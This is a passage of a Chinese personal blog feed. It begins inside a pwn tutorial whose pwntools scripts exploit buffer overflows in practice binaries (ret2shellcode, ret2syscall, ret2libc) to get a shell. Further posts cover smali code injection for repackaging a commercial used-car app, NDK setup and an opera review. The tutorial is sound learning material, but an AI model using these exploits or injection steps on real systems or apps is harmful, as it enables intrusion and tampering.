class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No system for you this time !!!"</span>);</span><br><span class="line">    gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">    <span class="built_in">strncpy</span>(buf2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bye bye ~"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 vmmap 可以看到 bss 段的执行权限。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">'A'</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x03-ret2syscall"><a href="#0x03-ret2syscall" class="headerlink" title="0x03 ret2syscall"></a>0x03 ret2syscall</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"This time, no system() and NO SHELLCODE!!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What do you plan to do?"</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要用到 ROPgadget，然后选几个合适的构造 shellcode。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only <span class="string">'pop|ret'</span> | grep <span class="string">'ebx'</span></span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br><span class="line"></span><br><span class="line">ROPgadget --binary rop  --string <span class="string">'/bin/sh'</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br><span class="line"></span><br><span class="line">ROPgadget --binary rop  --only <span class="string">'int'</span>                 </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./rop'</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">'A'</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>由于 libc 函数之间偏移是固定的，ASLR 保护只会随机中间地址，后 12 位是不变的，所以可以 got 表泄露已执行过的函数的地址。libc 中顺便也可以得到 /bin/sh。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">'./ret2libc3'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">'puts'</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak libc_start_main_got addr and return to main again"</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">'Can you find it !?'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get the related addr"</span></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"get shell"</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;我用的是 windows 的 ubuntu。&lt;/p&gt;
&lt;h3 id=&quot;安装-pwntools&quot;&gt;&lt;a href=&quot;#安装-p
      
    
    </summary>
    
    
      <category term="编程" scheme="https://github.com/Cracke-S-J/categories/programming/"/>
    
    
      <category term="pwn" scheme="https://github.com/Cracke-S-J/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Android Studio NDK 开发环境搭建</title>
    <link href="https://github.com/Cracke-S-J/2019/07/08/ndk/"/>
    <id>https://github.com/Cracke-S-J/2019/07/08/ndk/</id>
    <published>2019-07-08T09:17:51.000Z</published>
    <updated>2019-08-30T14:02:02.918Z</updated>
    
    <content type="html"><![CDATA[<ol><li>配好NDK路径。</li><li>在java层声明native方法，使用javah -d [路径] [类]，生成头文件。<br><code>C:\Users\12639\Documents\GitHub\Android\kuaiban\app\src\main\java&gt;javah -d ../jni ssj.kuaiban.MainActivity</code></li><li>在cpp里写代码。</li><li><p>写Android.mk和Application.mk</p><p>Android.mk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH := $(call my-dir)</span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line"></span><br><span class="line">LOCAL_MODULE := checkFlag</span><br><span class="line">LOCAL_SRC_FILES := checkFlag.c</span><br><span class="line"></span><br><span class="line">include $(BUILD_SHARED_LIBRARY)</span><br></pre></td></tr></table></figure><p>Application.mk(其实这句话也没什么卵用)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">APP_ABI := all</span><br></pre></td></tr></table></figure></li><li><p>右击app -&gt; Link C++ Project with Gradle -&gt; 选ndk-build -&gt; 选刚才写的Android.mk</p></li><li>配置build.gradle，在defaultConfig里面加：<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">externalNativeBuild &#123;</span><br><span class="line">         ndkBuild &#123;</span><br><span class="line">             arguments <span class="string">"NDK_APPLICATION_MK:=src/main/jni/Application.mk"</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></li></ol><p>在Android Studio 3.x上，这样基本就成了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;配好NDK路径。&lt;/li&gt;
&lt;li&gt;在java层声明native方法，使用javah -d [路径] [类]，生成头文件。&lt;br&gt;&lt;code&gt;C:\Users\12639\Documents\GitHub\Android\kuaiban\app\src\main
      
    
    </summary>
    
    
      <category term="编程" scheme="https://github.com/Cracke-S-J/categories/programming/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>给车王二手车套马甲</title>
    <link href="https://github.com/Cracke-S-J/2019/06/27/vest-car-king/"/>
    <id>https://github.com/Cracke-S-J/2019/06/27/vest-car-king/</id>
    <published>2019-06-27T12:26:41.000Z</published>
    <updated>2019-12-01T04:30:43.572Z</updated>
    
    <content type="html"><![CDATA[<p>加资源，要在R$*.smali、res/values/public.xml、res/value/ids.xml这三个里面加，编译不会出错，至于为什么闪退待研究。</p><p>然后手加了几段代码Activity$1.smali不能用，就用*&amp;111也可，加新class不忘注册。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;加资源，要在R$*.smali、res/values/public.xml、res/value/ids.xml这三个里面加，编译不会出错，至于为什么闪退待研究。&lt;/p&gt;
&lt;p&gt;然后手加了几段代码Activity$1.smali不能用，就用*&amp;amp;111也可，加新clas
      
    
    </summary>
    
    
      <category term="编程" scheme="https://github.com/Cracke-S-J/categories/programming/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
      <category term="马甲包" scheme="https://github.com/Cracke-S-J/tags/%E9%A9%AC%E7%94%B2%E5%8C%85/"/>
    
  </entry>
  
  <entry>
    <title>Android静态注入常用代码</title>
    <link href="https://github.com/Cracke-S-J/2019/06/27/android-inject-code/"/>
    <id>https://github.com/Cracke-S-J/2019/06/27/android-inject-code/</id>
    <published>2019-06-27T10:20:08.000Z</published>
    <updated>2019-11-29T12:34:34.578Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Toast"><a href="#Toast" class="headerlink" title="Toast:"></a>Toast:</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span>-string v0, <span class="string">"toast"</span></span><br><span class="line"><span class="keyword">const</span>/<span class="number">4</span> v1, <span class="number">0x1</span></span><br><span class="line">invoke-<span class="keyword">static</span> &#123;p0, v0, v1&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class="line">move-result-object v0</span><br><span class="line">invoke-virtual &#123;v0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br></pre></td></tr></table></figure><h2 id="AlertDialog"><a href="#AlertDialog" class="headerlink" title="AlertDialog:"></a>AlertDialog:</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span>-instance v0, Landroid/app/AlertDialog$Builder;</span><br><span class="line">invoke-direct &#123;v0, p0&#125;, Landroid/app/AlertDialog$Builder;-&gt;&lt;init&gt;(Landroid/content/Context;)V</span><br><span class="line"><span class="keyword">const</span>-string v1, <span class="string">"title"</span></span><br><span class="line">invoke-virtual &#123;v0, v1&#125;, Landroid/app/AlertDialog$Builder;-&gt;setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;</span><br><span class="line">move-result-object v0</span><br><span class="line"><span class="keyword">const</span>-string v1, <span class="string">"message"</span></span><br><span class="line">invoke-virtual &#123;v0, v1&#125;, Landroid/app/AlertDialog$Builder;-&gt;setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;</span><br><span class="line">move-result-object v0</span><br><span class="line"><span class="keyword">const</span>-string v1, <span class="string">"button"</span></span><br><span class="line"><span class="keyword">new</span>-instance v2, Lcom/carking/cn/activity/MainActivity$<span class="number">111</span>;</span><br><span class="line">invoke-direct &#123;v2, p0&#125;, Lcom/carking/cn/activity/MainActivity$<span class="number">111</span>;-&gt;&lt;init&gt;(Lcom/carking/cn/activity/MainActivity;)V</span><br><span class="line">invoke-virtual &#123;v0, v1, v2&#125;, Landroid/app/AlertDialog$Builder;-&gt;setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;</span><br><span class="line">move-result-object v0</span><br><span class="line"><span class="keyword">const</span>-string v1, <span class="string">"button"</span></span><br><span class="line"><span class="keyword">const</span>/<span class="number">4</span> v2, <span class="number">0x0</span></span><br><span class="line">invoke-virtual &#123;v0, v1, v2&#125;, Landroid/app/AlertDialog$Builder;-&gt;setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;</span><br><span class="line">move-result-object v0</span><br><span class="line">invoke-virtual &#123;v0&#125;, Landroid/app/AlertDialog$Builder;-&gt;show()Landroid/app/AlertDialog;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">.class Lcom/carking/cn/activity/Another$<span class="number">111</span>;</span><br><span class="line">.<span class="keyword">super</span> Ljava/lang/Object;</span><br><span class="line">.source <span class="string">"Another.java"</span></span><br><span class="line"></span><br><span class="line"># interfaces</span><br><span class="line">.implements Landroid/content/DialogInterface$OnClickListener;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># annotations</span><br><span class="line">.annotation system Ldalvik/annotation/EnclosingMethod;</span><br><span class="line">    value = Lcom/carking/cn/activity/Another;-&gt;onCreate(Landroid/os/Bundle;)V</span><br><span class="line">.end annotation</span><br><span class="line"></span><br><span class="line">.annotation system Ldalvik/annotation/InnerClass;</span><br><span class="line">    accessFlags = <span class="number">0x0</span></span><br><span class="line">    name = <span class="keyword">null</span></span><br><span class="line">.end annotation</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># instance fields</span><br><span class="line">.field <span class="keyword">final</span> synthetic <span class="keyword">this</span>$<span class="number">0</span>:Lcom/carking/cn/activity/Another;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># direct methods</span><br><span class="line">.method constructor &lt;init&gt;(Lcom/carking/cn/activity/Another;)V</span><br><span class="line">    .locals <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    iput-object p1, p0, Lcom/carking/cn/activity/Another$<span class="number">111</span>;-&gt;<span class="keyword">this</span>$<span class="number">0</span>:Lcom/carking/cn/activity/Another;</span><br><span class="line"></span><br><span class="line">    .line <span class="number">29</span></span><br><span class="line">    invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># virtual methods</span><br><span class="line">.<span class="function">method <span class="keyword">public</span> <span class="title">onClick</span><span class="params">(Landroid/content/DialogInterface;I)</span>V</span></span><br><span class="line"><span class="function">    .locals 3</span></span><br><span class="line"><span class="function">    .param p1, "dialog"    # Landroid/content/DialogInterface</span>;</span><br><span class="line">    .param p2, "which"    # I</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line <span class="number">34</span></span><br><span class="line">    <span class="keyword">const</span>-string v2, <span class="string">"https://www.google.com/"</span></span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;v2&#125;, Landroid/net/Uri;-&gt;parse(Ljava/lang/String;)Landroid/net/Uri;</span><br><span class="line"></span><br><span class="line">    move-result-object v1</span><br><span class="line"></span><br><span class="line">    .line <span class="number">35</span></span><br><span class="line">    .local v1, <span class="string">"uri"</span>:Landroid/net/Uri;</span><br><span class="line">    <span class="keyword">new</span>-instance v0, Landroid/content/Intent;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span>-string v2, <span class="string">"android.intent.action.VIEW"</span></span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v0, v2, v1&#125;, Landroid/content/Intent;-&gt;&lt;init&gt;(Ljava/lang/String;Landroid/net/Uri;)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">36</span></span><br><span class="line">    .local v0, <span class="string">"it"</span>:Landroid/content/Intent;</span><br><span class="line">    iget-object v2, p0, Lcom/carking/cn/activity/Another$<span class="number">111</span>;-&gt;<span class="keyword">this</span>$<span class="number">0</span>:Lcom/carking/cn/activity/Another;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v2, v0&#125;, Lcom/carking/cn/activity/Another;-&gt;startActivity(Landroid/content/Intent;)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">39</span></span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>Intent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span>-instance v0, Landroid/content/Intent;</span><br><span class="line">invoke-direct &#123;v0&#125;, Landroid/content/Intent;-&gt;&lt;init&gt;()V</span><br><span class="line"><span class="keyword">const</span>-<span class="class"><span class="keyword">class</span> <span class="title">v1</span>, <span class="title">Lcom</span>/<span class="title">carking</span>/<span class="title">cn</span>/<span class="title">activity</span>/<span class="title">Another</span></span>;</span><br><span class="line">invoke-virtual &#123;v0, p0, v1&#125;, Landroid/content/Intent;-&gt;setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;</span><br><span class="line">invoke-virtual &#123;p0, v0&#125;, Lcom/carking/cn/activity/MainActivity;-&gt;startActivity(Landroid/content/Intent;)V</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span>-instance v0, Landroid/content/Intent;</span><br><span class="line"><span class="keyword">const</span>-<span class="class"><span class="keyword">class</span> <span class="title">v1</span>, <span class="title">Lcom</span>/<span class="title">ssj</span>/<span class="title">loopviewdemo</span>/<span class="title">LunbotuActivity</span></span>;</span><br><span class="line">invoke-direct &#123;v0, p0, v1&#125;, Landroid/content/Intent;-&gt;&lt;init&gt;(Landroid/content/Context;Ljava/lang/Class;)V</span><br><span class="line">.local v0, <span class="string">"intent"</span>:Landroid/content/Intent;</span><br><span class="line">invoke-virtual &#123;p0, v0&#125;, Lcom/ssj/loopviewdemo/MainActivity;-&gt;startActivity(Landroid/content/Intent;)V</span><br></pre></td></tr></table></figure><p><code>adb logcat -v threadtime &gt; a.log</code><br>——— beginning of crash</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Toast&quot;&gt;&lt;a href=&quot;#Toast&quot; class=&quot;headerlink&quot; title=&quot;Toast:&quot;&gt;&lt;/a&gt;Toast:&lt;/h2&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter
      
    
    </summary>
    
    
      <category term="编程" scheme="https://github.com/Cracke-S-J/categories/programming/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>铡美案</title>
    <link href="https://github.com/Cracke-S-J/2019/06/24/kill-chenshimei/"/>
    <id>https://github.com/Cracke-S-J/2019/06/24/kill-chenshimei/</id>
    <published>2019-06-24T09:44:12.000Z</published>
    <updated>2019-07-01T09:59:35.588Z</updated>
    
    <content type="html"><![CDATA[<p>有名的包公戏。准叔演渣男是真俊。</p><p>。。。</p><p>陈世美考中一品状元、做了当朝驸马之后，宁愿死也不愿意与旧妻相认。秦香莲来到驸马府之后，陈世美也吓了一跳，也思考，也难过，但是几经纠结之后拒绝认妻。然后秦香莲去找王延龄，王延龄是当朝国老，包拯的恩师，宁愿官不做了，也要保陈世美与秦香莲相认之后，圣上不会怪罪。可见王延龄是爱陈世美的，但陈世美并不领情，王延龄一怒之下，让秦香莲找包拯告状，最终陈世美被送上龙头铡。</p><p>1、秦香莲也是死心眼，人家嫌弃你，你拿着钱走就是了，非要告来告去，终于陈世美死了，舒服了。</p><p>2、陈世美明知一死，宁死不愿与妻相认，可见他是多讨厌这个原生家庭。</p><p>3、陈世美很受皇上、太后、公主、甚至王延龄爱戴，可见他也并不全是一个坏人，而且十分有才。</p><p>4、包拯是文曲星下凡，来人间惩恶扬善，最后都动了私心，想放过陈世美。</p><p>陈世美在有功名之前是什么生活状态不清楚，但他死也不愿回去是真的。</p><p>还有一个版本是秦香莲死了，陈世美想收养瑛哥、东妹，被两个小孩拒绝了。可见两个小孩也不一般，也可以两个小孩是因为随爹才不一般，因为随娘的话，娘要死要活地也要舔住陈世美。</p><p>个人看这部戏，完全是站陈世美的，一是秦香莲太丑、陈世美太帅，二是原生家庭这点，很心酸。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;有名的包公戏。准叔演渣男是真俊。&lt;/p&gt;
&lt;p&gt;。。。&lt;/p&gt;
